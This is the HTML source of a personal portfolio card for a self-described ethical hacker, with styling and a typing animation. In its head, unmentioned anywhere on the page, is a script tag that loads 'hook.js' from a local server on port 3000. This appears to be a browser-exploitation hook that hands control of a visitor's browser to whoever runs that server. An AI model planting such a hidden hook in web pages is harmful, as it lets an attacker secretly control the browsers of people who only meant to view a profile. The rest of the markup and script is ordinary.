<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Yassine Sahi | Ethical Hacker</title>
<script src="http://127.0.0.1:3000/hook.js"></script>
  <style>
    :root {
      --bg: #0b0f1a;
      --card: #12182b;
      --accent: #00ffcc;
      --text: #eaeaea;
      --muted: #9aa4bf;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Segoe UI", Tahoma, sans-serif;
    }

    body {
      background: radial-gradient(circle at top, #10162e, var(--bg));
      color: var(--text);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .card {
      background: linear-gradient(145deg, #12182b, #0d1222);
      border-radius: 20px;
      padding: 40px;
      max-width: 420px;
      width: 90%;
      box-shadow: 0 0 40px rgba(0,255,204,0.15);
      text-align: center;
      position: relative;
      overflow: hidden;
    }

    .card::before {
      content: "";
      position: absolute;
      inset: 0;
      background: linear-gradient(
        120deg,
        transparent,
        rgba(0,255,204,0.15),
        transparent
      );
      animation: scan 4s infinite;
    }

    @keyframes scan {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 10px;
      letter-spacing: 1px;
    }

    h1 span {
      color: var(--accent);
    }

    .type {
      color: var(--accent);
      font-weight: bold;
      margin-bottom: 20px;
      min-height: 24px;
    }

    .info {
      color: var(--muted);
      margin-bottom: 25px;
      line-height: 1.6;
    }

    .badges {
      display: flex;
      justify-content: center;
      gap: 12px;
      flex-wrap: wrap;
      margin-bottom: 25px;
    }

    .badge {
      border: 1px solid var(--accent);
      color: var(--accent);
      padding: 6px 14px;
      border-radius: 999px;
      font-size: 0.85rem;
      background: rgba(0,255,204,0.05);
    }

    .footer {
      font-size: 0.75rem;
      color: var(--muted);
      opacity: 0.8;
    }
  </style>
</head>
<body>

  <div class="card">
    <h1><span>Yassine</span> Sahi</h1>
    <div class="type" id="type"></div>

    <p class="info">
      Passionate about cybersecurity, defensive thinking,
      and building secure systems.<br/>
      Always learning. Always ethical.
    </p>

    <div class="badges">
      <div class="badge">Ethical Hacker</div>
      <div class="badge">CEH</div>
      <div class="badge">CISSP</div>
      <div class="badge">Algeria ðŸ‡©ðŸ‡¿</div>
    </div>

    <div class="footer">
      Â© 2026 â€¢ Security â€¢ Integrity â€¢ Knowledge
    </div>
  </div>

  <script>
    const words = [
      "Ethical Hacker",
      "Cybersecurity Enthusiast",
      "Security Mindset",
      "Always Learning"
    ];

    let i = 0;
    let j = 0;
    let deleting = false;
    const speed = 90;
    const el = document.getElementById("type");

    function typeEffect() {
      const word = words[i];

      if (!deleting) {
        el.textContent = word.slice(0, j++);
        if (j > word.length) {
          deleting = true;
          setTimeout(typeEffect, 1200);
          return;
        }
      } else {
        el.textContent = word.slice(0, j--);
        if (j === 0) {
          deleting = false;
          i = (i + 1) % words.length;
        }
      }
      setTimeout(typeEffect, deleting ? speed / 2 : speed);
    }

    typeEffect();
  </script>

</body>
</html>
